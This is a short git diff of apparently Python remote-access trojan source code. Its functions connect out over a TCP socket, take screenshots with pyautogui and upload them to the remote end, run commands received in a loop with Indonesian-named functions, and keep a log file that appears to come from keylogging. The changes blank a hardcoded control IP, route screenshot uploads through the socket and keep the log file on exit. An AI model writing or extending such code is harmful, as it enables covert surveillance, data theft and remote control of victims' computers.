@@ -23,7 +23,7 @@ import ctypes
 from filetarget import download_file, upload_file
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = '192.168.18.198'
+ip = ''
 main_log1 = threading.Event()
 
 def start_log():
@@ -54,7 +54,7 @@ def change_directory(cmd):
 def screen_shot():
     ss = pyautogui.screenshot()
     ss.save('ss.png')
-    upload_file('ss.png')
+    upload_file(sok,'ss.png')
     os.remove("ss.png")
 
 def execute(cmd):
@@ -225,7 +225,6 @@ def jalankan_perintah():
     while True:
         perintah = terima_perintah()
         if perintah in ('exit', 'quit'):
-            os.remove('baca_log.txt')
             break
         if perintah == 'clear':
             pass
